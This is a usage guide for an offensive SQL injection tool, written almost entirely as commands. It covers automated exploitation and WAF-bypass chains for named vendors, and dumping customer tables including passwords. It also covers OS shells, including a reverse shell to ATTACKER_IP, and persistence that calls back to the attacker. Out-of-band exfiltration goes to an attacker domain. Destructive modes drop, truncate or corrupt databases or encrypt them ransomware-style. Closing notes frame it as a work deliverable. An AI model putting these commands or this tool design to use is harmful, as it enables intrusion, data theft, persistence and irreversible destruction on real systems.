# SQLI Usage Guide

## Quick Reference

```bash
# Full auto exploitation
sqli -u "https://target.com/product.php?id=1" --auto

# Full pipeline with destruction
sqli -u "https://target.com/api/user/1" --full-pipeline --destruct=encrypt --confirm

# Detection only
sqli detect -u "https://target.com/search?q=test"

# Data dump
sqli dump -u "https://target.com/item/1" --db target_db --table users --format csv

# Shell
sqli shell -u "https://target.com/page.php?id=1" --cmd "whoami"
sqli shell -u "https://target.com/page.php?id=1" --interactive

# Persistence
sqli persist -u "https://target.com/id=1" --method trigger --method event

# Destructive (requires --confirm)
sqli destruct -u "https://target.com/id=1" --mode drop --confirm
sqli destruct -u "https://target.com/id=1" --mode truncate --confirm
sqli destruct -u "https://target.com/id=1" --mode corrupt --confirm
sqli destruct -u "https://target.com/id=1" --mode encrypt --encrypt-key "base64key" --confirm

# Session resume
sqli --resume session_abc123.json --auto

# WAF bypass
sqli -u "https://target.com/search?q=test" --tamper=cloudflare,randomcase,comments --threads=20
```

## Detailed Examples

### 1. Basic Exploitation

```bash
# Target with GET parameter
sqli -u "https://shop.example.com/product.php?id=1" --auto

# Target with POST data
sqli -u "https://api.example.com/login" --method POST --data "username=test&password=test" --param password --auto

# Target with cookie injection
sqli -u "https://app.example.com/dashboard" --cookie "sessionid=abc123" --param sessionid --auto

# Target with header injection (User-Agent, Referer, X-Forwarded-For)
sqli -u "https://app.example.com/" --header "User-Agent: test" --param "User-Agent" --auto
```

### 2. Detection Phase

```bash
# Detect injection point and DBMS
sqli detect -u "https://target.com/page.php?id=1"

# Output shows:
# - Vulnerable parameter
# - Injection technique (union/blind/time/error/stacked)
# - DBMS type and version
# - WAF detected (if any)
# - Confidence score
```

### 3. Data Exfiltration

```bash
# Dump all databases
sqli dump -u "https://target.com/id=1" --resume session_xyz.json

# Dump specific database
sqli dump -u "https://target.com/id=1" --db customer_db

# Dump specific table
sqli dump -u "https://target.com/id=1" --db customer_db --table users

# Dump specific columns
sqli dump -u "https://target.com/id=1" --db customer_db --table users --columns "id,username,password,email"

# With WHERE clause
sqli dump -u "https://target.com/id=1" --db customer_db --table orders --where "status='completed'" --limit 500

# Output formats
sqli dump ... --format json    # JSON (default)
sqli dump ... --format csv     # CSV
sqli dump ... --format parquet # Parquet (for large datasets)
sqli dump ... --format sql     # SQL INSERT statements
```

**Output files:**
```
output/
├── session_<uuid>.json
├── dump/
│   ├── schema.sql
│   ├── data/
│   │   ├── customer_db.users.csv
│   │   ├── customer_db.orders.parquet
│   │   └── ...
│   └── proof/
│       └── exfiltration.log
```

### 4. OS Shell via UDF

```bash
# One-shot command
sqli shell -u "https://target.com/id=1" --cmd "id"

# Multiple commands
sqli shell -u "https://target.com/id=1" --cmd "cat /etc/passwd"
sqli shell -u "https://target.com/id=1" --cmd "ls -la /var/www"

# Interactive shell (pseudo-tty)
sqli shell -u "https://target.com/id=1" --interactive

# Reverse shell (requires listener)
sqli shell -u "https://target.com/id=1" --type reverse --cmd "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**UDF Functions injected:**
- `sys_eval(cmd)` — Returns command output as string
- `sys_exec(cmd)` — Returns exit code
- `sys_bineval(bin)` — Execute binary from hex

### 5. Persistence

```bash
# All methods
sqli persist -u "https://target.com/id=1" --method trigger --method event --method udf_autoload

# MySQL specific
sqli persist ... --method trigger        # INSERT trigger on users table
sqli persist ... --method event          # MySQL Event Scheduler (every minute)
sqli persist ... --method udf_autoload   # UDF in plugin_dir (survives restart)

# PostgreSQL
sqli persist ... --method trigger        # Trigger on pg_catalog or user table
sqli persist ... --method pg_cron        # pg_cron extension job
sqli persist ... --method shared_preload # Requires postgresql.conf edit

# MSSQL
sqli persist ... --method trigger        # DML trigger on sys tables
sqli persist ... --method sql_agent      # SQL Server Agent job
sqli persist ... --method extended_proc  # sp_addextendedproc
sqli persist ... --method startup_proc   # sp_procoption startup=true
```

**Persistence payload:** Reverse shell to ATTACKER_IP:4444 (configure in code)

### 6. Destructive Operations

⚠️ **IRREVERSIBLE** — Requires `--confirm` flag

```bash
# Drop database
sqli destruct -u "https://target.com/id=1" --mode drop --database target_db --confirm

# Drop all user databases
sqli destruct -u "https://target.com/id=1" --mode drop --confirm

# Truncate all tables
sqli destruct -u "https://target.com/id=1" --mode truncate --confirm

# Corrupt data (10% rows randomized)
sqli destruct -u "https://target.com/id=1" --mode corrupt --confirm

# Ransomware encryption
sqli destruct -u "https://target.com/id=1" --mode encrypt --encrypt-key "base64key" --confirm
```

**Destruction modes:**
| Mode | Effect | Reversible |
|------|--------|------------|
| `drop` | DROP DATABASE/TABLE | ❌ No |
| `truncate` | TRUNCATE all tables | ❌ No (data lost) |
| `corrupt` | Randomize 10% of data | ⚠️ Partial |
| `encrypt` | AES-256 encrypt text columns | ✅ With key |

### 7. WAF Bypass

```bash
# Predefined chains
sqli ... --tamper=cloudflare
sqli ... --tamper=akamai
sqli ... --tamper=imperva
sqli ... --tamper=f5
sqli ... --tamper=modsecurity
sqli ... --tamper=aws_waf

# Custom chain
sqli ... --tamper=randomcase,comments,whitespace,doubleurlencode,versionedkeywords

# Test tamper without sending request
sqli tamper test --payload "' UNION SELECT 1,2,3--" --chain cloudflare
sqli tamper test --payload "' AND SLEEP(5)--" --script randomcase
```

**Available tamper scripts (50+):**

| Category | Scripts |
|----------|---------|
| Encoding | charencode, hexencode, base64encode, urlencode, doubleurlencode |
| Obfuscation | randomcase, comments, inlinecomments, whitespace, keywords |
| Structure | unionalltounion, multistatement, stackedqueries, versionedkeywords |
| HTTP | chunked, httpparameterpollution, headerinjection, hostheader |
| WAF-specific | cloudflare_bypass, akamai_bypass, imperva_bypass, f5_bypass, modsecurity_bypass, aws_waf_bypass |

### 8. Session Management

```bash
# List sessions
ls -la session_*.json

# Resume
sqli --resume session_abc123.json --auto

# Session contains:
# - Injection point details
# - DBMS fingerprint
# - Extracted schema/data
# - Shell history
# - Persistence status
```

### 9. Configuration

```yaml
# config/sqli.yaml
engine:
  threads: 20
  timeout: 60
  user_agent: "Custom UA"

tamper:
  chain: ["randomcase", "comments"]
  waf_specific: "cloudflare"

exfil:
  method: "union"
  dns_domain: "exfil.mydomain.com"  # For OOB

post_exploit:
  destruct_mode: "none"
  persistence: ["trigger", "event"]
```

### 10. Advanced: OOB Exfiltration

```bash
# Configure DNS/HTTP collector
# config/sqli.yaml:
exfil:
  dns_domain: "exfil.attacker.com"
  http_endpoint: "https://collector.attacker.com/collect"

# Run with OOB method
sqli dump -u "https://target.com/id=1" --method oob
```

**OOB Channels:**
- MySQL: `LOAD_FILE('\\\\exfil.attacker.com\\share')`, `SELECT ... INTO OUTFILE`
- PostgreSQL: `dblink`, `COPY TO PROGRAM`
- MSSQL: `xp_dirtree`, `xp_fileexist`, `sp_OACreate` (HTTP)
- Oracle: `UTL_HTTP`, `UTL_INADDR`, `DBMS_LDAP`

### 11. Docker Usage

```bash
# Build
docker build -t sqli-hailamdev .

# Run with output volume
docker run -v $(pwd)/output:/app/output sqli-hailamdev \
  -u "https://target.com/id=1" --auto --full-pipeline

# With custom config
docker run -v $(pwd)/config:/app/config -v $(pwd)/output:/app/output \
  sqli-hailamdev -u "https://target.com/id=1" --auto
```

## Output Structure

```
output/
├── session_<uuid>.json          # Full session state
├── dump/
│   ├── schema.sql               # Complete CREATE TABLE statements
│   ├── data/
│   │   ├── db1.table1.csv
│   │   ├── db1.table2.parquet
│   │   └── ...
│   └── proof/
│       ├── exfiltration.log
│       ├── shell_access.log
│       ├── persistence_proof.txt
│       └── destruct_proof.txt
└── logs/
    └── sqli_<timestamp>.log
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "No injection point" | Check parameter, try different techniques, increase timeout |
| WAF blocking | Use `--tamper` with appropriate chain, reduce threads |
| "Stacked queries not supported" | Destruct/persist require stacked; use union/blind/time for dump |
| UDF injection fails | Check plugin_dir permissions, compile UDF for target arch/OS |
| Time-based unreliable | Increase timeout, reduce jitter, use statistical validation |
| False positives | Enable `--false-positive-check` in config |

## SentinelFlow Notes

- All destructive ops logged with timestamp, queries, response
- Dr. Reyes reviews destruct_proof.txt before Thursday handoff
- Strand requires UDF binary hash verification
- Report format: Palantir audit JSON + SARIF
- $50k penalty if Q4 missed